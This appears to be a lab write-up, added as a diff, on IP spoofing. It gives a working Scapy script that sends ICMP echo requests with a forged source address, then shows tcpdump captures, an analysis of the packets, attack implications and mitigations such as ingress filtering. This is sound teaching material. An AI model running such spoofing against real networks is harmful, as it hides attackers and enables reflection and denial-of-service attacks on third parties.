@@ -1,0 +1,62 @@
+Implementation:
+I created a Python script using Scapy to spoof ICMP echo request packets with an arbitrary source IP address. The script allows specifying both the spoofed source IP and the destination IP as command-line arguments.
+
+#!/usr/bin/env python3
+from scapy.all import *
+import sys
+
+if(len(sys.argv) != 3):
+    print("Usage: %s <source_ip> <destination_ip>" % sys.argv[0])
+    sys.exit(1)
+
+src_ip = sys.argv[1]
+dst_ip = sys.argv[2]
+
+ip = IP()
+ip.src = src_ip
+ip.dst = dst_ip
+
+icmp = ICMP()
+
+packet = ip/icmp
+
+print(f"Sending spoofed ICMP packet from {src_ip} to {dst_ip}")
+packet.show()
+
+send(packet, verbose=1)
+
+print("Packet sent! Check packet capture to see the response.")
+
+Execution and Observation:
+I ran the script from the attacker container to send a spoofed ICMP packet that appeared to come from 192.168.1.100 (a non-existent IP on our network) to host B (10.9.0.6).
+
+In a separate terminal, I used tcpdump to capture ICMP traffic on the network interface. The following capture showed successful spoofing:
+
+16:44:32.922994 IP 192.168.1.100 > 10.9.0.6: ICMP echo request, id 0, seq 0, length 8
+16:44:32.923024 IP 10.9.0.6 > 192.168.1.100: ICMP echo reply, id 0, seq 0, length 8
+
+This was different from the actual non spoofed packets which were of length 64 bytes.
+
+Analysis:
+The tcpdump output confirms that:
+
+1. The spoofed packet was successfully sent with the source IP 192.168.1.100
+2. Host B (10.9.0.6) accepted the packet as legitimate
+3. Host B generated an ICMP echo reply back to the spoofed IP address
+4. The packet had distinctive characteristics compared to legitimate pings:
+   - Length of 8 bytes (vs. 64 bytes for regular pings)
+   - ICMP ID and sequence values of 0 (vs. incrementing values for regular pings)
+
+Security Implications:
+This experiment demonstrates a fundamental security weakness in the IP protocol: there is no built-in authentication mechanism for the source address. Hosts generally trust the source IP address in received packets without validation.
+
+This vulnerability enables several attack vectors:
+1. Denial of Service (DoS) attacks - An attacker can spoof source IPs to hide their identity
+2. Man-in-the-middle attacks - Source address spoofing can be used in ARP or routing attacks
+3. Reflection/amplification attacks - Attackers can send packets to services that will respond to spoofed source addresses
+4. Bypass IP-based authentication - Systems that trust source IPs for authentication can be compromised
+
+Mitigation techniques include:
+1. Ingress/egress filtering (BCP 38) - Networks should filter outbound traffic with source addresses not from their network
+2. Deeper packet inspection
+3. Using protocols with built-in authentication (like TCP with its handshake process)
